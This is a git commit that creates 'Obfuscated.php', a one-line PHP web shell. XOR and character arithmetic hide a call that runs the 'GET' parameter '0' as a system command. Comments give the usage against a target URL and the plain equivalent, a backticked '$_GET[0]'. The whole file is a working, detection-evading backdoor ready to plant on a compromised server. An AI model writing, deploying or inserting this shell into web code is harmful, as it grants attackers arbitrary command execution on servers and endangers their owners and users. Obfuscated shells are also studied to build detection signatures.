e10f365e7082f1678e9b8f8fc81279e61e553829
Raj Chowdhury <30806882+Rajchowdhury420@users.noreply.github.com>
2024-07-19 00:36:04 +0530

    Create Obfuscated.php

---
+++ Obfuscated.php
@@ -0,0 +1,4 @@
+<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
+
+// [*] Usage: http://target.com/path/to/shell.php?0=command
+// [*] Note: This is obfuscation of <?=`$_GET[0]`?>
